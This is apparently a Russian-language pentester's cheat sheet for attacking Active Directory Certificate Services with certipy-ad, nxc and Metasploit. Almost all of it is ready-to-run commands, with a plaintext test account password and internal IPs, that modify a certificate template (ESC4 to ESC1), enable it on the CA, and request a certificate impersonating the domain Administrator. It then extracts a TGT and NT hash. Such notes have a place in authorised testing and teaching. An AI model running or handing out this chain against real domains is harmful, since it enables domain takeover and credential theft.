# ADCS

Находим серты, смотрим все, включенные, не включенные
certipy-ad find -u Pent1 -p 'K132dsjds' -dc-ip 172.16.5.54 -vulnerable -stdout

если вектор ESC4-ESC1, есть права у обычных пользаков на изменение, правим с сохран оригинала
certipy-ad template -u 'Pent1@nova.local' -p 'K132dsjds' -dc-ip 172.16.12.111 -template 'Copy of Computer' -save-old
вернуть потом обратно - certipy-ad template -u 'Pent1@nova.local' -p 'K132dsjds' -dc-ip 172.16.12.111 -template 'Copy of Computer' -configuration 'Copy of Computer.json'

Запрашиваем опять серты, чтобы убедиться в изменении, если шаблон был не активен, пробуем активировать
certipy-ad ca -u 'Pent1' -p 'K132dsjds' -dc-ip 172.16.12.111 -target-ip 172.16.12.1 -ca 'CA-Nova' -enable-template 'Copy of Computer' -debug
-target-ip - центр сертфикации или без него

Далее делаем ESC1:
Нам нужен польз с адм правами и SID
1. Узнать права - msf6 auxiliary(gather/ldap_query) > set ACTION ENUM_ADMIN_OBJECTS
2. nxc ldap 172.16.12.111 -u Pent1 -p 'K132dsjds' --admin-count
Смотрим у кого больше прав)

certipy-ad req -u Pent1@nova.local -p 'K132dsjds' -ca 'CA-Nova' -dc-ip 172.16.12.111 -target 'caroot-nve.nova.local' -template 'WebServer' -upn Administrator@nova.local -sid 'S-1-5-21-3989769018-1505689183-2121205709-500'

Далее запрашиваем ТГТ и NT-хеш
certipy-ad auth -pfx 'administrator.pfx' -dc-ip 172.16.12.111
